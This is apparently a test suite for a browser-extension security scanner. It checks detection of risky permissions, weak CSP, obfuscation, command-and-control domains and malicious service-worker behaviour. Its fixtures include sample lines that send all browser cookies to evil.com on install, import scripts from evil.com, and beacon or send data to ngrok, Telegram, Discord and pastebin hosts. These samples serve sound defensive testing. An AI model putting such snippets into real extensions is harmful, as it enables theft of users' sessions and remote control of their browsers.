import { test, describe } from 'node:test';
import assert from 'node:assert';
import {
  analyzePermissions,
  analyzeContentScripts,
  analyzeScriptContent,
  checkManifestVersion,
} from '../dist/analyzers.js';

describe('Analyzers', () => {
  const mockExtInfo = { id: 'test-extension-id', version: '1.0.0' };

  describe('analyzePermissions', () => {
    test('detects critical permission <all_urls>', () => {
      const manifest = {
        name: 'Test Extension',
        permissions: ['<all_urls>'],
      };
      const findings = analyzePermissions(manifest, mockExtInfo);
      
      assert.ok(findings.length > 0);
      const critical = findings.find(f => f.severity === 'critical');
      assert.ok(critical);
      assert.ok(critical.message.includes('<all_urls>'));
    });

    test('detects warning permission cookies', () => {
      const manifest = {
        name: 'Test Extension',
        permissions: ['cookies'],
      };
      const findings = analyzePermissions(manifest, mockExtInfo);
      
      assert.ok(findings.some(f => f.message.includes('cookies')));
    });

    test('handles optional_permissions', () => {
      const manifest = {
        name: 'Test Extension',
        optional_permissions: ['history'],
      };
      const findings = analyzePermissions(manifest, mockExtInfo);
      
      assert.ok(findings.some(f => f.message.includes('history')));
    });

    test('handles host_permissions (MV3)', () => {
      const manifest = {
        name: 'Test Extension',
        host_permissions: ['*://*/*'],
      };
      const findings = analyzePermissions(manifest, mockExtInfo);
      
      assert.ok(findings.some(f => f.severity === 'critical'));
    });

    test('detects wildcard host patterns', () => {
      const manifest = {
        name: 'Test Extension',
        permissions: ['https://*.example.com/*'],
      };
      const findings = analyzePermissions(manifest, mockExtInfo);
      
      assert.ok(findings.some(f => f.id.includes('wildcard-host')));
    });

    test('returns empty for safe permissions', () => {
      const manifest = {
        name: 'Test Extension',
        permissions: [],
      };
      const findings = analyzePermissions(manifest, mockExtInfo);
      
      assert.strictEqual(findings.length, 0);
    });

    test('uses custom prefix', () => {
      const manifest = {
        name: 'Test Extension',
        permissions: ['tabs'],
      };
      const findings = analyzePermissions(manifest, mockExtInfo, 'ff');
      
      assert.ok(findings[0].id.startsWith('ff-'));
    });
  });

  describe('analyzeContentScripts', () => {
    test('detects all_urls content script injection', () => {
      const manifest = {
        name: 'Test Extension',
        content_scripts: [{ matches: ['<all_urls>'] }],
      };
      const findings = analyzeContentScripts(manifest, mockExtInfo);
      
      assert.ok(findings.some(f => f.id.includes('cs-all-urls')));
    });

    test('detects wildcard content script injection', () => {
      const manifest = {
        name: 'Test Extension',
        content_scripts: [{ matches: ['*://*/*'] }],
      };
      const findings = analyzeContentScripts(manifest, mockExtInfo);
      
      assert.ok(findings.some(f => f.id.includes('cs-all-urls')));
    });

    test('detects document_start execution', () => {
      const manifest = {
        name: 'Test Extension',
        content_scripts: [{ matches: ['https://example.com/*'], run_at: 'document_start' }],
      };
      const findings = analyzeContentScripts(manifest, mockExtInfo);
      
      assert.ok(findings.some(f => f.id.includes('cs-document-start')));
    });

    test('detects MAIN world access', () => {
      const manifest = {
        name: 'Test Extension',
        content_scripts: [{ matches: ['https://example.com/*'], world: 'MAIN' }],
      };
      const findings = analyzeContentScripts(manifest, mockExtInfo);
      
      assert.ok(findings.some(f => f.id.includes('cs-main-world')));
    });

    test('returns empty for no content scripts', () => {
      const manifest = { name: 'Test Extension' };
      const findings = analyzeContentScripts(manifest, mockExtInfo);
      
      assert.strictEqual(findings.length, 0);
    });
  });

  describe('analyzeScriptContent', () => {
    test('detects eval usage', () => {
      const content = 'const result = eval("1+1");';
      const findings = analyzeScriptContent(content, 'test.js', mockExtInfo, { name: 'Test' });
      
      assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('eval')));
    });

    test('detects new Function usage', () => {
      const content = 'const fn = new Function("return 1");';
      const findings = analyzeScriptContent(content, 'test.js', mockExtInfo, { name: 'Test' });
      
      assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('Function')));
    });

    test('detects document.write', () => {
      const content = 'document.write("<script>alert(1)</script>");';
      const findings = analyzeScriptContent(content, 'test.js', mockExtInfo, { name: 'Test' });
      
      assert.ok(findings.some(f => f.message.includes('document.write')));
    });

    test('detects external URLs', () => {
      const content = 'fetch("https://malicious-site.com/data");';
      const findings = analyzeScriptContent(content, 'test.js', mockExtInfo, { name: 'Test' });
      
      assert.ok(findings.some(f => f.id.includes('external-urls')));
    });

    test('ignores legitimate URLs', () => {
      const content = 'fetch("https://googleapis.com/api");';
      const findings = analyzeScriptContent(content, 'test.js', mockExtInfo, { name: 'Test' });
      
      // Should not flag legitimate Google API
      assert.ok(!findings.some(f => f.id.includes('external-urls')));
    });

    test('detects CSP stripping patterns', () => {
      const content = 'chrome.declarativeNetRequest.updateSessionRules({});';
      const findings = analyzeScriptContent(content, 'test.js', mockExtInfo, { name: 'Test' });
      
      assert.ok(findings.some(f => f.message.includes('network rules')));
    });

    test('returns empty for clean code', () => {
      const content = 'console.log("Hello, World!");';
      const findings = analyzeScriptContent(content, 'test.js', mockExtInfo, { name: 'Test' });
      
      assert.strictEqual(findings.length, 0);
    });
  });

  describe('checkManifestVersion', () => {
    test('warns about MV2 deprecation', () => {
      const manifest = {
        name: 'Test Extension',
        manifest_version: 2,
      };
      const findings = checkManifestVersion(manifest, mockExtInfo);
      
      assert.ok(findings.length > 0);
      assert.ok(findings[0].severity === 'warning');
      assert.ok(findings[0].message.includes('deprecated'));
    });

    test('no warning for MV3', () => {
      const manifest = {
        name: 'Test Extension',
        manifest_version: 3,
      };
      const findings = checkManifestVersion(manifest, mockExtInfo);
      
      assert.strictEqual(findings.length, 0);
    });
  });
});

// CSP, UpdateUrl, ExternallyConnectable, WebAccessibleResources tests
import {
  analyzeCSP,
  analyzeUpdateUrl,
  analyzeExternallyConnectable,
  analyzeWebAccessibleResources,
} from '../dist/analyzers.js';

const ext = { id: 'test-ext', path: '/tmp' };

describe('analyzeCSP', () => {
  test('detects missing CSP in MV2', () => {
    const manifest = { manifest_version: 2 };
    const findings = analyzeCSP(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('csp-missing')));
  });

  test('no warning for MV3 without CSP (has defaults)', () => {
    const manifest = { manifest_version: 3 };
    const findings = analyzeCSP(manifest, ext);
    assert.strictEqual(findings.length, 0);
  });

  test('detects unsafe-eval in MV2 string CSP', () => {
    const manifest = { manifest_version: 2, content_security_policy: "script-src 'self' 'unsafe-eval'" };
    const findings = analyzeCSP(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('csp-unsafe-eval')));
    assert.ok(findings.some(f => f.severity === 'critical'));
  });

  test('detects unsafe-inline in MV3 object CSP', () => {
    const manifest = { manifest_version: 3, content_security_policy: { extension_pages: "script-src 'self' 'unsafe-inline'" } };
    const findings = analyzeCSP(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('csp-unsafe-inline')));
  });

  test('detects wildcard in script-src', () => {
    const manifest = { manifest_version: 2, content_security_policy: "script-src * 'self'" };
    const findings = analyzeCSP(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('csp-wildcard')));
  });

  test('detects remote script loading', () => {
    const manifest = { manifest_version: 2, content_security_policy: "script-src 'self' https://cdn.evil.com" };
    const findings = analyzeCSP(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('csp-remote-scripts')));
  });

  test('clean CSP produces no findings', () => {
    const manifest = { manifest_version: 2, content_security_policy: "script-src 'self'; object-src 'self'" };
    const findings = analyzeCSP(manifest, ext);
    assert.strictEqual(findings.length, 0);
  });
});

describe('analyzeUpdateUrl', () => {
  test('detects external update URL', () => {
    const manifest = { update_url: 'https://evil.com/updates.xml' };
    const findings = analyzeUpdateUrl(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('update-url-external')));
  });

  test('detects HTTP update URL', () => {
    const manifest = { update_url: 'http://evil.com/updates.xml' };
    const findings = analyzeUpdateUrl(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('update-url-http')));
    assert.ok(findings.some(f => f.severity === 'critical'));
  });

  test('allows Chrome Web Store update URL', () => {
    const manifest = { update_url: 'https://clients2.google.com/service/update2/crx' };
    const findings = analyzeUpdateUrl(manifest, ext);
    assert.ok(!findings.some(f => f.id.includes('update-url-external')));
  });

  test('no update_url produces no findings', () => {
    const findings = analyzeUpdateUrl({}, ext);
    assert.strictEqual(findings.length, 0);
  });
});

describe('analyzeExternallyConnectable', () => {
  test('detects all_urls in matches', () => {
    const manifest = { externally_connectable: { matches: ['<all_urls>'] } };
    const findings = analyzeExternallyConnectable(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('ec-all-urls')));
    assert.ok(findings.some(f => f.severity === 'critical'));
  });

  test('detects wildcard in matches', () => {
    const manifest = { externally_connectable: { matches: ['*://*.example.com/*'] } };
    const findings = analyzeExternallyConnectable(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('ec-wildcard')));
  });

  test('detects wildcard extension ids', () => {
    const manifest = { externally_connectable: { ids: ['*'] } };
    const findings = analyzeExternallyConnectable(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('ec-all-extensions')));
  });

  test('specific domains produce no findings', () => {
    const manifest = { externally_connectable: { matches: ['https://example.com/*'] } };
    const findings = analyzeExternallyConnectable(manifest, ext);
    assert.strictEqual(findings.length, 0);
  });

  test('no externally_connectable produces no findings', () => {
    const findings = analyzeExternallyConnectable({}, ext);
    assert.strictEqual(findings.length, 0);
  });
});

describe('analyzeWebAccessibleResources', () => {
  test('detects MV2 style string array', () => {
    const manifest = { web_accessible_resources: ['icon.png', 'content.js'] };
    const findings = analyzeWebAccessibleResources(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('war-mv2-all')));
  });

  test('detects all_urls in MV3 matches', () => {
    const manifest = { web_accessible_resources: [{ resources: ['icon.png'], matches: ['<all_urls>'] }] };
    const findings = analyzeWebAccessibleResources(manifest, ext);
    assert.ok(findings.some(f => f.id.includes('war-all-urls')));
  });

  test('restricted MV3 resources produce no findings', () => {
    const manifest = { web_accessible_resources: [{ resources: ['icon.png'], matches: ['https://example.com/*'] }] };
    const findings = analyzeWebAccessibleResources(manifest, ext);
    assert.strictEqual(findings.length, 0);
  });

  test('no web_accessible_resources produces no findings', () => {
    const findings = analyzeWebAccessibleResources({}, ext);
    assert.strictEqual(findings.length, 0);
  });
});

// Permission combo tests
import { analyzePermissionCombos } from '../dist/analyzers.js';

describe('analyzePermissionCombos', () => {
  test('detects webRequest + webRequestBlocking + all_urls combo', () => {
    const manifest = { permissions: ['webRequest', 'webRequestBlocking', '<all_urls>'] };
    const findings = analyzePermissionCombos(manifest, ext);
    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('MitM')));
  });

  test('detects cookies + all_urls combo', () => {
    const manifest = { permissions: ['cookies'], host_permissions: ['<all_urls>'] };
    const findings = analyzePermissionCombos(manifest, ext);
    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('session hijacking')));
  });

  test('detects debugger + all_urls combo', () => {
    const manifest = { permissions: ['debugger', '<all_urls>'] };
    const findings = analyzePermissionCombos(manifest, ext);
    assert.ok(findings.some(f => f.message.includes('debugging')));
  });

  test('detects proxy + webRequest combo', () => {
    const manifest = { permissions: ['proxy', 'webRequest'] };
    const findings = analyzePermissionCombos(manifest, ext);
    assert.ok(findings.some(f => f.message.includes('proxy')));
  });

  test('no combo match for safe permissions', () => {
    const manifest = { permissions: ['storage', 'notifications'] };
    const findings = analyzePermissionCombos(manifest, ext);
    assert.strictEqual(findings.length, 0);
  });

  test('empty permissions produce no findings', () => {
    const findings = analyzePermissionCombos({}, ext);
    assert.strictEqual(findings.length, 0);
  });

  test('detects combo across permissions and host_permissions', () => {
    const manifest = { permissions: ['cookies'], host_permissions: ['*://*/*'] };
    const findings = analyzePermissionCombos(manifest, ext);
    assert.ok(findings.some(f => f.severity === 'critical'));
  });

  test('detects management + downloads dropper pattern', () => {
    const manifest = { permissions: ['management', 'downloads'] };
    const findings = analyzePermissionCombos(manifest, ext);
    assert.ok(findings.some(f => f.message.includes('dropper')));
  });
});

// WebStore analysis tests
import { analyzeWebStoreInfo } from '../dist/webstore.js';

describe('analyzeWebStoreInfo', () => {
  test('detects stale extension (>1 year)', async () => {
    const info = { name: 'OldExt', lastUpdated: '2024-01-01T00:00:00Z', users: 5000, rating: 4.5 };
    const findings = await analyzeWebStoreInfo(info);
    assert.ok(findings.some(f => f.id === 'webstore-stale' || f.id === 'webstore-abandoned'));
  });

  test('detects abandoned extension (>2 years)', async () => {
    const info = { name: 'DeadExt', lastUpdated: '2023-01-01T00:00:00Z', users: 5000, rating: 4.5 };
    const findings = await analyzeWebStoreInfo(info);
    assert.ok(findings.some(f => f.id === 'webstore-abandoned'));
  });

  test('no stale warning for recent extension', async () => {
    const info = { name: 'FreshExt', lastUpdated: new Date().toISOString(), users: 5000, rating: 4.5 };
    const findings = await analyzeWebStoreInfo(info);
    assert.ok(!findings.some(f => f.id.includes('stale') || f.id.includes('abandoned')));
  });

  test('detects low user count', async () => {
    const info = { name: 'SmallExt', users: 50, rating: 4.5 };
    const findings = await analyzeWebStoreInfo(info);
    assert.ok(findings.some(f => f.id === 'webstore-low-users'));
  });

  test('detects low rating', async () => {
    const info = { name: 'BadExt', users: 5000, rating: 2.1 };
    const findings = await analyzeWebStoreInfo(info);
    assert.ok(findings.some(f => f.id === 'webstore-low-rating'));
  });

  test('returns not-found for null info', async () => {
    const findings = await analyzeWebStoreInfo(null);
    assert.ok(findings.some(f => f.id === 'webstore-not-found'));
  });
});

// =============================================
// analyzeObfuscation
// =============================================

const { analyzeObfuscation } = await import('../dist/analyzers.js');

describe('analyzeObfuscation', () => {
  const ext = { id: 'test-ext', path: '/tmp' };
  const manifest = { name: 'TestExt', manifest_version: 3 };

  test('detects hex/unicode escape overuse', () => {
    const code = Array(60).fill('var x = "\\x61\\x62";').join('\n');
    const findings = analyzeObfuscation(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.id.includes('obfuscation-escapes')));
  });

  test('detects packed long lines', () => {
    const code = 'a'.repeat(6000);
    const findings = analyzeObfuscation(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.id.includes('obfuscation-packed')));
  });

  test('detects string rotation pattern', () => {
    const code = 'var _0x1a2b = ["hello","world"]; function _0x3c4d(i) { return _0x1a2b[i]; }';
    const findings = analyzeObfuscation(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.id.includes('obfuscation-string-rotation')));
  });

  test('detects excessive fromCharCode', () => {
    const code = Array(10).fill('var c = String.fromCharCode(72);').join('\n');
    const findings = analyzeObfuscation(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.id.includes('obfuscation-fromcharcode')));
  });

  test('detects obfuscated variable names', () => {
    const code = Array(15).fill('var _0xabcd1234 = 1;').join('\n');
    const findings = analyzeObfuscation(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.id.includes('obfuscation-varnames')));
  });

  test('detects Dean Edwards packer', () => {
    const code = "eval(function(p,a,c,k,e,d){return 'packed'})";
    const findings = analyzeObfuscation(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.id.includes('obfuscation-packer')));
  });

  test('returns empty for clean code', () => {
    const code = 'console.log("hello world");';
    const findings = analyzeObfuscation(code, 'bg.js', ext, manifest);
    assert.strictEqual(findings.length, 0);
  });
});

// =============================================
// Malicious DB Sources
// =============================================

const { SOURCES } = await import('../dist/malicious-db.js');

describe('Malicious DB Sources', () => {
  test('has 4 sources configured', () => {
    assert.strictEqual(SOURCES.length, 4);
  });

  test('includes gnyman source', () => {
    assert.ok(SOURCES.some(s => s.name === 'gnyman'));
  });

  test('all sources have required fields', () => {
    for (const source of SOURCES) {
      assert.ok(source.name, 'source should have name');
      assert.ok(source.url, 'source should have url');
      assert.ok(typeof source.parser === 'function', 'source should have parser');
    }
  });
});

// =============================================
// Enhanced Permission Detection
// =============================================

describe('Enhanced Permission Detection', () => {
  test('detects MV3 scripting permission', () => {
    const manifest = { permissions: ['scripting'], manifest_version: 3 };
    const ext = { id: 'test', path: '/tmp' };
    const findings = analyzePermissions(manifest, ext);
    assert.ok(findings.some(f => f.message.includes('inject scripts')));
  });

  test('detects desktopCapture as critical', () => {
    const manifest = { permissions: ['desktopCapture'], manifest_version: 3 };
    const ext = { id: 'test', path: '/tmp' };
    const findings = analyzePermissions(manifest, ext);
    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('screen')));
  });

  test('detects identity permission', () => {
    const manifest = { permissions: ['identity'], manifest_version: 3 };
    const ext = { id: 'test', path: '/tmp' };
    const findings = analyzePermissions(manifest, ext);
    assert.ok(findings.some(f => f.message.includes('OAuth')));
  });

  test('detects declarativeNetRequestWithHostAccess as critical', () => {
    const manifest = { permissions: ['declarativeNetRequestWithHostAccess'], manifest_version: 3 };
    const ext = { id: 'test', path: '/tmp' };
    const findings = analyzePermissions(manifest, ext);
    assert.ok(findings.some(f => f.severity === 'critical'));
  });
});

describe('Enhanced Permission Combos', () => {
  test('detects scripting + all_urls combo', () => {
    const manifest = { permissions: ['scripting'], host_permissions: ['<all_urls>'], manifest_version: 3 };
    const ext = { id: 'test', path: '/tmp' };
    const findings = analyzePermissionCombos(manifest, ext);
    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('inject')));
  });

  test('detects identity + all_urls combo', () => {
    const manifest = { permissions: ['identity'], host_permissions: ['<all_urls>'], manifest_version: 3 };
    const ext = { id: 'test', path: '/tmp' };
    const findings = analyzePermissionCombos(manifest, ext);
    assert.ok(findings.some(f => f.message.includes('OAuth')));
  });

  test('detects desktopCapture + all_urls combo', () => {
    const manifest = { permissions: ['desktopCapture'], host_permissions: ['<all_urls>'], manifest_version: 3 };
    const ext = { id: 'test', path: '/tmp' };
    const findings = analyzePermissionCombos(manifest, ext);
    assert.ok(findings.some(f => f.message.includes('spyware')));
  });
});

// =============================================
// Risk Scorer
// =============================================

const { calculateRiskScores, calculateOverallScore } = await import('../dist/risk-scorer.js');

describe('Risk Scorer', () => {
  test('calculates score from findings', () => {
    const findings = [
      { id: 'a', severity: 'critical', extension: 'Ext A (id1)', message: 'x' },
      { id: 'b', severity: 'warning', extension: 'Ext A (id1)', message: 'y' },
      { id: 'c', severity: 'info', extension: 'Ext B (id2)', message: 'z' },
    ];
    const scores = calculateRiskScores(findings);
    assert.strictEqual(scores.length, 2);
    // Ext A: 25 + 8 = 33 → grade C
    const extA = scores.find(s => s.extension.includes('Ext A'));
    assert.strictEqual(extA.score, 33);
    assert.strictEqual(extA.grade, 'C');
    // Ext B: 2 → grade A
    const extB = scores.find(s => s.extension.includes('Ext B'));
    assert.strictEqual(extB.score, 2);
    assert.strictEqual(extB.grade, 'A');
  });

  test('caps at 100', () => {
    const findings = Array(10).fill(null).map((_, i) => ({
      id: `f${i}`, severity: 'critical', extension: 'Bad (id)', message: 'bad',
    }));
    const scores = calculateRiskScores(findings);
    assert.strictEqual(scores[0].score, 100);
    assert.strictEqual(scores[0].grade, 'F');
  });

  test('overall score uses max', () => {
    const scores = [
      { extension: 'A', score: 10, grade: 'A', criticalCount: 0, warningCount: 1, infoCount: 1 },
      { extension: 'B', score: 80, grade: 'F', criticalCount: 3, warningCount: 0, infoCount: 0 },
    ];
    const overall = calculateOverallScore(scores);
    assert.strictEqual(overall.score, 80);
    assert.strictEqual(overall.grade, 'F');
  });

  test('empty findings return grade A', () => {
    const overall = calculateOverallScore([]);
    assert.strictEqual(overall.score, 0);
    assert.strictEqual(overall.grade, 'A');
  });

  test('scan summary includes risk scores', async () => {
    const { scan } = await import('../dist/index.js');
    const result = await scan('chrome', { quiet: true });
    assert.ok('riskScores' in result);
    assert.ok('overallRiskScore' in result);
    assert.ok('overallGrade' in result);
  });
});

// =============================================
// Policy Engine
// =============================================

const { evaluatePolicy, generateSamplePolicy } = await import('../dist/policy.js');

describe('Policy Engine', () => {
  const scores = [
    { extension: 'Good (aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)', score: 5, grade: 'A', criticalCount: 0, warningCount: 0, infoCount: 2 },
    { extension: 'Risky (bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb)', score: 60, grade: 'D', criticalCount: 2, warningCount: 1, infoCount: 0 },
  ];
  const findings = [];
  const ids = ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'];

  test('maxGrade violation', () => {
    const policy = { maxGrade: 'C' };
    const violations = evaluatePolicy(policy, scores, findings, ids);
    assert.ok(violations.some(v => v.rule === 'maxGrade' && v.extension.includes('Risky')));
  });

  test('maxScore violation', () => {
    const policy = { maxScore: 50 };
    const violations = evaluatePolicy(policy, scores, findings, ids);
    assert.ok(violations.some(v => v.rule === 'maxScore'));
  });

  test('blocklist violation', () => {
    const policy = { blocklist: ['bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'] };
    const violations = evaluatePolicy(policy, scores, findings, ids);
    assert.ok(violations.some(v => v.rule === 'blocklist'));
  });

  test('allowlist violation', () => {
    const policy = { allowlist: ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'] };
    const violations = evaluatePolicy(policy, scores, findings, ids);
    assert.ok(violations.some(v => v.rule === 'allowlist' && v.extension.includes('Risky')));
  });

  test('required missing', () => {
    const policy = { required: ['cccccccccccccccccccccccccccccccc'] };
    const violations = evaluatePolicy(policy, scores, findings, ids);
    assert.ok(violations.some(v => v.rule === 'required'));
  });

  test('no violations when compliant', () => {
    const policy = { maxGrade: 'F', maxScore: 100 };
    const violations = evaluatePolicy(policy, scores, findings, ids);
    assert.strictEqual(violations.length, 0);
  });

  test('generateSamplePolicy returns valid structure', () => {
    const p = generateSamplePolicy();
    assert.ok(p.name);
    assert.ok(p.maxGrade);
    assert.ok(Array.isArray(p.blockedPermissions));
  });
});

// =============================================
// Baseline & Diff
// =============================================

const { exportBaseline, diffBaseline } = await import('../dist/baseline.js');

describe('Baseline & Diff', () => {
  const mockSummary = {
    critical: 1, warning: 2, info: 3, total: 6,
    riskScores: [
      { extension: 'ExtA (aaa)', score: 10, grade: 'A', criticalCount: 0, warningCount: 1, infoCount: 1 },
      { extension: 'ExtB (bbb)', score: 50, grade: 'C', criticalCount: 1, warningCount: 1, infoCount: 0 },
    ],
    overallRiskScore: 50,
    overallGrade: 'C',
  };

  test('exportBaseline creates valid structure', () => {
    const bl = exportBaseline(mockSummary, 'chrome');
    assert.strictEqual(bl.browser, 'chrome');
    assert.strictEqual(bl.extensions.length, 2);
    assert.ok(bl.timestamp);
  });

  test('diffBaseline detects added extensions', () => {
    const baseline = exportBaseline({ ...mockSummary, riskScores: [mockSummary.riskScores[0]] }, 'chrome');
    const diff = diffBaseline(baseline, mockSummary);
    assert.strictEqual(diff.added.length, 1);
    assert.ok(diff.added[0].extension.includes('ExtB'));
  });

  test('diffBaseline detects removed extensions', () => {
    const baseline = exportBaseline(mockSummary, 'chrome');
    const current = { ...mockSummary, riskScores: [mockSummary.riskScores[0]] };
    const diff = diffBaseline(baseline, current);
    assert.strictEqual(diff.removed.length, 1);
  });

  test('diffBaseline detects grade changes', () => {
    const baseline = exportBaseline(mockSummary, 'chrome');
    const changed = { ...mockSummary, riskScores: [
      { ...mockSummary.riskScores[0], score: 40, grade: 'C' },
      mockSummary.riskScores[1],
    ]};
    const diff = diffBaseline(baseline, changed);
    assert.strictEqual(diff.gradeChanged.length, 1);
    assert.strictEqual(diff.gradeChanged[0].before.grade, 'A');
    assert.strictEqual(diff.gradeChanged[0].after.grade, 'C');
  });

  test('diffBaseline unchanged count', () => {
    const baseline = exportBaseline(mockSummary, 'chrome');
    const diff = diffBaseline(baseline, mockSummary);
    assert.strictEqual(diff.unchanged, 2);
    assert.strictEqual(diff.driftScore, 0);
  });
});

// =============================================
// Suspicious Domain Detection
// =============================================

describe('Suspicious Domain Detection', () => {
  const ext = { id: 'test-ext', path: '/tmp' };
  const manifest = { name: 'TestExt', manifest_version: 3 };

  test('detects raw IP connections', () => {
    const code = 'fetch("http://192.168.1.100/api/data")';
    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.id.includes('suspicious-domain') && f.message.includes('IP address')));
  });

  test('detects ngrok tunnels', () => {
    const code = 'fetch("https://abc123.ngrok.io/exfil")';
    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('ngrok')));
  });

  test('detects Telegram bot C2', () => {
    const code = 'fetch("https://api.telegram.org/bot123456:ABC/sendMessage")';
    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('Telegram')));
  });

  test('detects Discord webhook exfil', () => {
    const code = 'fetch("https://discord.com/api/webhooks/123/abc")';
    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('Discord')));
  });

  test('detects pastebin payload', () => {
    const code = 'fetch("https://pastebin.com/raw/abc123")';
    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.severity === 'critical' && f.message.includes('paste')));
  });

  test('detects suspicious TLDs', () => {
    const code = 'fetch("https://evil-tracker.xyz/collect")';
    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
    assert.ok(findings.some(f => f.message.includes('suspicious TLD')));
  });

  test('does not flag legitimate URLs', () => {
    const code = 'fetch("https://googleapis.com/api/v1/data")';
    const findings = analyzeScriptContent(code, 'bg.js', ext, manifest);
    assert.ok(!findings.some(f => f.id.includes('suspicious-domain')));
  });
});

import { analyzeServiceWorker } from '../dist/analyzers.js';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

describe('analyzeServiceWorker', () => {
  const mockExtInfo = { id: 'test-sw-ext', version: '1.0.0', path: '' };

  function withServiceWorker(content, callback) {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'extvet-sw-'));
    fs.writeFileSync(path.join(tmpDir, 'sw.js'), content);
    try {
      callback(tmpDir);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  }

  test('returns empty for non-MV3 extension', () => {
    const manifest = { name: 'Test', manifest_version: 2, background: { scripts: ['bg.js'] } };
    const findings = analyzeServiceWorker(manifest, mockExtInfo, '/tmp/nonexist');
    assert.strictEqual(findings.length, 0);
  });

  test('detects external importScripts', () => {
    withServiceWorker('importScripts("https://evil.com/payload.js");', (dir) => {
      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
      const critical = findings.find(f => f.severity === 'critical' && f.message.includes('imports external scripts'));
      assert.ok(critical, 'Should detect external importScripts');
    });
  });

  test('detects alarm-based fetch pattern', () => {
    const code = `
      chrome.alarms.create('beacon', { periodInMinutes: 5 });
      chrome.alarms.onAlarm.addListener((alarm) => { fetch('https://c2.example.com/ping'); });
    `;
    withServiceWorker(code, (dir) => {
      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
      const alarmFetch = findings.find(f => f.message.includes('Alarm triggers network fetch'));
      assert.ok(alarmFetch, 'Should detect alarm+fetch C2 pattern');
    });
  });

  test('detects cookie theft on install', () => {
    const code = `
      chrome.runtime.onInstalled.addListener(() => {
        chrome.cookies.getAll({}, (cookies) => { fetch('https://evil.com', { body: JSON.stringify(cookies) }); });
      });
    `;
    withServiceWorker(code, (dir) => {
      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
      const theft = findings.find(f => f.severity === 'critical' && f.message.includes('cookies immediately on install'));
      assert.ok(theft, 'Should detect cookie theft on install');
    });
  });

  test('detects service worker keepalive tricks', () => {
    const code = `
      const port = chrome.runtime.connect({ name: 'keepAlive' });
    `;
    withServiceWorker(code, (dir) => {
      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
      const keepalive = findings.find(f => f.message.includes('keepalive'));
      assert.ok(keepalive, 'Should detect keepalive trick');
    });
  });

  test('detects self-uninstall (anti-forensics)', () => {
    withServiceWorker('chrome.management.uninstallSelf();', (dir) => {
      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
      const antiForensics = findings.find(f => f.message.includes('self-uninstall'));
      assert.ok(antiForensics, 'Should detect self-uninstall');
    });
  });

  test('detects large service worker', () => {
    const code = 'x'.repeat(600000);
    withServiceWorker(code, (dir) => {
      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
      const large = findings.find(f => f.message.includes('Large service worker'));
      assert.ok(large, 'Should detect large service worker');
    });
  });

  test('clean service worker produces no critical findings', () => {
    const code = `
      chrome.runtime.onInstalled.addListener(() => { console.log('installed'); });
      chrome.action.onClicked.addListener((tab) => { console.log(tab.url); });
    `;
    withServiceWorker(code, (dir) => {
      const manifest = { name: 'Test', manifest_version: 3, background: { service_worker: 'sw.js' } };
      const findings = analyzeServiceWorker(manifest, mockExtInfo, dir);
      const criticals = findings.filter(f => f.severity === 'critical');
      assert.strictEqual(criticals.length, 0, 'Clean SW should have no critical findings');
    });
  });
});
